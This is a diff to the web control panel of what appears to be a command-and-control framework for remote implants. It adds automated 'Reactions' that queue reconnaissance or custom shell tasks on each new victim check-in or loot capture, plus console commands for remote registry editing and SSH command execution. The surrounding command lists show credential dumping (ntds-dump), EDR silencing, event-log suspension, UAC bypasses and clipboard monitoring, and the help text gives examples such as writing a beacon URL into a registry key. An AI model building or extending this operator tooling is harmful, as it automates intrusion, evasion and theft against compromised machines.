@@ -2083,13 +2083,20 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 
 <!-- Webhooks -->
 <div class="modal-overlay" id="modal-webhooks">
-  <div class="modal" style="width:520px">
+  <div class="modal" style="width:540px">
     <div class="modal-header">
-      <span class="modal-title">🔔 Notification Webhooks</span>
+      <span class="modal-title">🔔 Automations</span>
       <button class="modal-close btn" onclick="closeModal('modal-webhooks')">✕</button>
     </div>
-    <div class="modal-body">
-      <div style="margin-bottom:12px">
+    <div class="modal-body" style="padding-top:0">
+      <!-- Tab strip -->
+      <div style="display:flex;gap:0;border-bottom:1px solid var(--border);margin-bottom:12px">
+        <button id="auto-tab-wh" class="btn" style="border-radius:0;border-bottom:2px solid var(--accent);font-size:11px;padding:8px 14px" onclick="autoSwitchTab('wh')">Webhooks</button>
+        <button id="auto-tab-rx" class="btn btn-ghost" style="border-radius:0;border-bottom:2px solid transparent;font-size:11px;padding:8px 14px" onclick="autoSwitchTab('rx')">Reactions</button>
+      </div>
+
+      <!-- Webhooks panel -->
+      <div id="auto-panel-wh">
         <div id="webhooks-list" style="display:flex;flex-direction:column;gap:8px;margin-bottom:12px"></div>
         <div style="border-top:1px solid var(--border);padding-top:12px">
           <div style="font-size:11px;font-weight:600;color:var(--text2);margin-bottom:8px">Add Webhook</div>
@@ -2115,12 +2122,50 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               <label style="display:flex;align-items:center;gap:4px;font-size:11px"><input type="checkbox" id="wh-ev-task"> task done</label>
             </div>
           </div>
+          <div style="display:flex;justify-content:flex-end;margin-top:8px">
+            <button class="btn btn-primary" style="font-size:11px" onclick="addWebhook()">+ Add Webhook</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Reactions panel -->
+      <div id="auto-panel-rx" style="display:none">
+        <div style="color:var(--text3);font-size:10px;margin-bottom:10px">
+          Reactions auto-queue tasks on every agent that fires the chosen event (e.g. every new check-in automatically gets a <code>sysinfo</code> task).
+        </div>
+        <div id="reactions-list" style="display:flex;flex-direction:column;gap:8px;margin-bottom:12px"></div>
+        <div style="border-top:1px solid var(--border);padding-top:12px">
+          <div style="font-size:11px;font-weight:600;color:var(--text2);margin-bottom:8px">Add Reaction</div>
+          <div class="form-row"><label>Name</label><input id="rx-name" placeholder="auto-sysinfo"></div>
+          <div class="form-row">
+            <label>Event</label>
+            <select id="rx-event">
+              <option value="checkin">check-in (new agent)</option>
+              <option value="loot">loot captured</option>
+            </select>
+          </div>
+          <div class="form-row">
+            <label>Task type</label>
+            <select id="rx-task-type">
+              <option value="SYSINFO">SYSINFO</option>
+              <option value="SCREENSHOT">SCREENSHOT</option>
+              <option value="PS">PS (process list)</option>
+              <option value="ENV">ENV</option>
+              <option value="SHELL">SHELL (custom)</option>
+            </select>
+          </div>
+          <div class="form-row" id="rx-args-row">
+            <label>Args</label>
+            <input id="rx-args" placeholder="only for SHELL — e.g. whoami /all">
+          </div>
+          <div style="display:flex;justify-content:flex-end;margin-top:8px">
+            <button class="btn btn-primary" style="font-size:11px" onclick="addReaction()">+ Add Reaction</button>
+          </div>
         </div>
       </div>
     </div>
     <div class="modal-footer">
       <button class="btn btn-ghost" onclick="closeModal('modal-webhooks')">Close</button>
-      <button class="btn btn-primary" onclick="addWebhook()">Add Webhook</button>
     </div>
   </div>
 </div>
@@ -5746,6 +5791,14 @@ const AC_COMMANDS = [
   ['clip-monitor start','clip-monitor start [secs] — monitorizar portapapeles continuamente'],
   ['clip-monitor dump','clip-monitor dump — recuperar entradas capturadas'],
   ['clip-monitor stop','clip-monitor stop — detener monitor y volcar log'],
+  // Registry R/W
+  ['reg','reg <query|set|delete|list> ...'],
+  ['reg query','reg query <HIVE\\Path> [ValueName] — leer valor o listar todos'],
+  ['reg set','reg set <HIVE\\Path> <Name> <Value> — escribir REG_SZ'],
+  ['reg delete','reg delete <HIVE\\Path> [ValueName] — borrar valor o clave entera'],
+  ['reg list','reg list <HIVE\\Path> — listar subclaves'],
+  // SSH exec
+  ['ssh-exec','ssh-exec <host> [port] <user> <pass> <cmd> — ejecutar comando vía SSH'],
 ];
 
 // Commands only available on Windows agents — hidden from autocomplete on Linux agents
@@ -5772,6 +5825,7 @@ const AC_WIN_ONLY = new Set([
   'edr-silence','edr-silence-rm','eventlog-suspend','eventlog-resume',
   'elevate fodhelper','elevate computerdefaults','elevate cmlua',
   'peb-spoof','hwbp-clear','ntds-dump',
+  'reg','reg query','reg set','reg delete','reg list',
 ]);
 
 let acIdx = -1;
@@ -8489,6 +8543,69 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       const [bs,...br] = args.split(' ');
       if (bs==='list') { taskType='BOF_STORE_LIST'; }
       else if (bs==='unload') { taskType='BOF_STORE_UNLOAD'; taskArgs=br[0]||''; }
+      break;
+    }
+
+    // ── Registry R/W ──────────────────────────────────────────────────────
+    // reg query  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion [ValueName]
+    // reg set    HKLM\SOFTWARE\... ValueName Value
+    // reg delete HKLM\SOFTWARE\... [ValueName]
+    // reg list   HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
+    case 'reg': {
+      const rp = args.trim().split(/\s+/);
+      const rsub = (rp[0] || '').toLowerCase();
+      if (rsub === 'query' && rp.length >= 2) {
+        taskType = 'REG_QUERY';
+        taskArgs = JSON.stringify({path: rp[1], name: rp[2] || ''});
+      } else if (rsub === 'set' && rp.length >= 4) {
+        taskType = 'REG_SET';
+        taskArgs = JSON.stringify({path: rp[1], name: rp[2], value: rp.slice(3).join(' ')});
+      } else if (rsub === 'delete' && rp.length >= 2) {
+        taskType = 'REG_DELETE';
+        taskArgs = JSON.stringify({path: rp[1], name: rp[2] || ''});
+      } else if (rsub === 'list' && rp.length >= 2) {
+        taskType = 'REG_LIST';
+        taskArgs = JSON.stringify({path: rp[1]});
+      } else {
+        addConsoleOutput(
+          'uso: reg <subcomando> ...\n\n' +
+          '  reg query  <HIVE\\\\Path> [ValueName]     — leer valor (o listar todos)\n' +
+          '  reg set    <HIVE\\\\Path> <Name> <Value>   — escribir REG_SZ\n' +
+          '  reg delete <HIVE\\\\Path> [ValueName]     — borrar valor o clave\n' +
+          '  reg list   <HIVE\\\\Path>                 — listar subclaves\n\n' +
+          'Ejemplos:\n' +
+          '  reg query  HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion CurrentVersion\n' +
+          '  reg set    HKCU\\\\Software\\\\ENDGAME beacon http://10.0.0.1:8080\n' +
+          '  reg list   HKLM\\\\SOFTWARE',
+          '', null);
+        return;
+      }
+      break;
+    }
+
+    // ── SSH Command Execution ─────────────────────────────────────────────
+    // ssh-exec <host> [port] <user> <pass> <cmd>
+    case 'ssh-exec': {
+      const sep = args.trim().split(/\s+/);
+      if (sep.length < 4) {
+        addConsoleOutput(
+          'uso: ssh-exec <host> [port] <user> <pass> <cmd>\n\n' +
+          'Ejecuta un comando en un host remoto vía SSH (password auth).\n\n' +
+          'Ejemplos:\n' +
+          '  ssh-exec 192.168.1.50 root r00tpass id\n' +
+          '  ssh-exec 192.168.1.50 2222 root r00tpass whoami',
+          '', null);
+        return;
+      }
+      let seHost = sep[0], sePort = 22, seUser, sePass, seCmd;
+      if (/^\d+$/.test(sep[1]) && parseInt(sep[1]) < 65536) {
+        sePort = parseInt(sep[1]); seUser = sep[2]; sePass = sep[3]; seCmd = sep.slice(4).join(' ');
+      } else {
+        seUser = sep[1]; sePass = sep[2]; seCmd = sep.slice(3).join(' ');
+      }
+      if (!seCmd) { addConsoleOutput('error: falta el comando a ejecutar', '', null); return; }
+      taskType = 'SSH_EXEC';
+      taskArgs  = JSON.stringify({host: seHost, port: sePort, user: seUser, pass: sePass, cmd: seCmd});
       break;
     }
 
@@ -13973,7 +14090,18 @@ let webhooks = [];
 
 async function openWebhooksModal() {
   await loadWebhooks();
+  await loadReactions();
+  autoSwitchTab('wh');
   openModal('modal-webhooks');
+}
+
+function autoSwitchTab(tab) {
+  ['wh','rx'].forEach(t => {
+    document.getElementById('auto-panel-'+t).style.display = t===tab ? '' : 'none';
+    const btn = document.getElementById('auto-tab-'+t);
+    if (t===tab) { btn.style.borderBottom='2px solid var(--accent)'; btn.classList.remove('btn-ghost'); }
+    else { btn.style.borderBottom='2px solid transparent'; btn.classList.add('btn-ghost'); }
+  });
 }
 
 async function loadWebhooks() {
@@ -14035,6 +14163,64 @@ async function deleteWebhook(id) {
 
 async function toggleWebhook(id, enabled) {
   const r = await api('PATCH', `/api/webhooks/${id}`, {enabled});
+  if (!r.ok) toast('Error: '+(r.error||'unknown'),'red');
+}
+
+// ── Reactions ────────────────────────────────────────────────────────────────
+let reactions = [];
+
+async function loadReactions() {
+  const r = await api('GET', '/api/reactions');
+  if (r.ok) { reactions = r.data || []; renderReactions(); }
+}
+
+function renderReactions() {
+  const el = document.getElementById('reactions-list');
+  if (!el) return;
+  if (!reactions.length) {
+    el.innerHTML = '<div style="color:var(--text3);font-size:11px;padding:6px 0">No reactions configured. Add one below to auto-queue tasks on events.</div>';
+    return;
+  }
+  el.innerHTML = reactions.map(rx => `
+    <div style="display:flex;align-items:center;gap:8px;padding:8px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:6px">
+      <label style="display:flex;align-items:center;cursor:pointer">
+        <input type="checkbox" ${rx.enabled?'checked':''} onchange="toggleReaction(${rx.id},this.checked)" style="margin-right:6px">
+      </label>
+      <div style="flex:1;min-width:0">
+        <div style="font-size:12px;font-weight:600">${esc(rx.name)}</div>
+        <div style="font-size:10px;color:var(--text3)">on <strong>${esc(rx.event)}</strong> → <code>${esc(rx.task_type)}</code>${rx.task_args?' '+esc(rx.task_args):''}</div>
+      </div>
+      <button class="btn btn-danger btn-sm" style="font-size:10px" onclick="deleteReaction(${rx.id})">🗑</button>
+    </div>`).join('');
+}
+
+async function addReaction() {
+  const taskType = document.getElementById('rx-task-type').value;
+  const taskArgs = taskType === 'SHELL' ? (document.getElementById('rx-args').value.trim()) : '';
+  const body = {
+    name:      document.getElementById('rx-name').value.trim() || (document.getElementById('rx-event').value+'-'+taskType.toLowerCase()),
+    event:     document.getElementById('rx-event').value,
+    task_type: taskType,
+    task_args: taskArgs,
+  };
+  if (!body.name) { toast('Name required','red'); return; }
+  const r = await api('POST', '/api/reactions', body);
+  if (r.ok) {
+    toast('Reaction added','green');
+    document.getElementById('rx-name').value = '';
+    document.getElementById('rx-args').value = '';
+    await loadReactions();
+  } else toast('Error: '+(r.error||'unknown'),'red');
+}
+
+async function deleteReaction(id) {
+  const r = await api('DELETE', `/api/reactions/${id}`);
+  if (r.ok) { toast('Deleted','yellow'); await loadReactions(); }
+  else toast('Error: '+(r.error||'unknown'),'red');
+}
+
+async function toggleReaction(id, enabled) {
+  const r = await api('PATCH', `/api/reactions/${id}`, {enabled});
   if (!r.ok) toast('Error: '+(r.error||'unknown'),'red');
 }
 </script>
